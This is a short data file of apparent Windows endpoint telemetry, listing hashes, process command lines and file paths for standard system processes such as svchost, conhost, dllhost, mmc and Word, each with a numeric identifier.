8daa31fbb6dfc08603094fc71a423c8113047c6eba3cb7c1c056b60ab92558bf,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/system32/svchost.exe -k LocalServiceAndNoImpersonation'},473600
d592b5fb5ac571fdf49a355e43aec4b3080489d20b4371a8a685404918f162b3,{'subject': 'c:/program files/vmware/vmware tools/vmtoolsd.exe C:/Program Files/VMware/VMware Tools/vmtoolsd.exe'},473602
d1343f476ec0143c42a7065386cdf5fcb6b9e36c87d9e78630cd6bb5531e167d,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/system32/svchost.exe -k bthsvcs'},473604
849dbbd7901f95e8d9447a2d3934e8a4578915a0267b789b70311a9adcdcb3cc,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/System32/svchost.exe -k secsvcs'},473608
9ec2e230b93fbd61e31aefd701b472be216c4d065948ae4b901bc4b58ad6c791,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/System32/svchost.exe -k WerSvcGroup'},470039
df7c1e8df37dad4e92bcb1b5a2d7b2f32cc970a2f0821b695e3883d68ecedcec,{'subject': 'c:/windows/system32/werfault.exe werfault.exe /h /shared Global/0b1b4811f8354baa85133a8866e3764c'},470040
bbb0bc77e654b7cff0faa53d0df36fb50534b9ce12a302cf8ce4817808ff47f2,{'file': 'c:/windows/system32/cmd.exe'},538
2d1777e046f038d77ca598f2d3470df7d68415587970d8af1d68ed03f93729e4,{'subject': 'c:/windows/system32/cmd.exe C:/Windows/system32/cmd.exe'},473124
5ffe6c979758ed98bbdeb2682958b5e2f8edf028e0e4b4d4172c435d649dcbd0,{'file': 'c:/windows/explorer.exe'},14375
6ee22cacc0f8dfb2fa1e0c10872fb0dc6f90141e930a124373f44fbe4aafa6ea,{'subject': 'c:/windows/system32/dwm.exe C:/Windows/system32/Dwm.exe'},471088
5da757b67c14c1c51e782bbd79e316f36a6adedf09ae4263ad124419962a2d68,{'subject': 'c:/program files/microsoft office/office14/winword.exe C:/Program Files/Microsoft Office/Office14/WINWORD.EXE  /Embedding'},471095
bb1cbcf3dabfc6f45dc55a2d794b53d83a7d3f011c541736accbd1514364aabd,{'file': 'c:/windows/system32/taskhost.exe'},115770
dcdc1f556d3a5a9b2b22667bbbec6907cf57ff92f906bb00a7ab897f88c9bf07,{'subject': 'c:/windows/system32/conhost.exe /??/C:/Windows/system32/conhost.exe 1684006446-1058827808936043199-1597127883207347087914054253422057058390-1254866157'},473156
ed01506336b7b1409f3f00e9bf0d45eefd14b3a84b8ee017038abd53216d5ac4,{'file': 'c:/program files/confer/repux.exe'},1097
4e9c2e1b5c0ff46460ada4e4b1c948870a184800c283c086ce201cab3b002dd3,{'file': 'c:/windows/system32/conhost.exe'},115786
97dce3c0dd70f86ddf396ea422e228c5308c9a6853281987aa9105d45dab163b,{'subject': 'c:/windows/system32/mmc.exe C:/Windows/system32/mmc.exe C:/Windows/system32/eventvwr.msc /s'},473675
f57d06d723144394de09948ffd85bf028bae5a03ef57141803ba86f7541f5f0a,{'subject': 'c:/windows/system32/consent.exe consent.exe 984 378 015BDEA0'},473676
9c11618608817838c73bcf72731e90c0ec1a50cb5e4a82deda97fcc8859ec54c,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}'},473677
6a82b7343d9f1052b407c83eced4b40e855c59f90af81a397455e1c7f95eb267,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}'},473678
84c0a744defba29b0700174b32b0487a0311852dad8eb6d2ce6560ba85d11ba0,{'subject': 'c:/windows/system32/conhost.exe /??/C:/Windows/system32/conhost.exe -1954982672-1395070906-900951638-1122404726-1939151056-862880661802321035874149057'},471117
c98d019f5c441131ee744378632071e99f3767bb8b458b9973db1fd46c31474f,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/system32/svchost.exe -k LocalService'},471120
